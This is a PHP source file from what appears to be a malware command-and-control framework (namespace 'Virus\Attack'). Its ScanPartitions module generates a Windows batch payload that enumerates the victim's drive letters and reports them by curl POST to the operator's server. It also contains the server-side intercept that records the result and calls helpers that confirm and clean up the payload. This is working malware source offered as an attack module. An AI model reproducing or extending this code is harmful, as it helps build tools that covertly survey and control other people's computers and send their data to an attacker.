<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class ScanPartitions extends AttackInterface {
    private string $availableDrives = "";

    public function __construct() {
    }

    /**
     * This will generate the intercept code that will be placed in /viruses/{virus_id}/attacks/{attack_id}/report.php
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        $drives = $_POST["drives"];
        $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
        $attack->setAvailableDrives($drives);
        $attack->setExecuted();
        $attack->saveState();
        <?php return ob_get_clean();
    }
    //@formatter:on

    public function setAvailableDrives(string $availableDrives): void {
        $this->availableDrives = $availableDrives;
    }

    public function getAvailableDrives(): array {
        return str_split($this->availableDrives);
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->availableDrives = $state["available_drives"];
    }

    /**
     * This will get the state of an attack as a json string
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["available_drives"] = $this->availableDrives;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST --form "drives=!drives!" <?php echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        @echo off
        SetLocal EnableDelayedExpansion
        chCp 65001
        set drives=.
        for %%i in (a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z) do (
        if exist %%i:\ (set drives=!drives!%%i)
        )
        set drives=%drives:~1%
        <?php
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
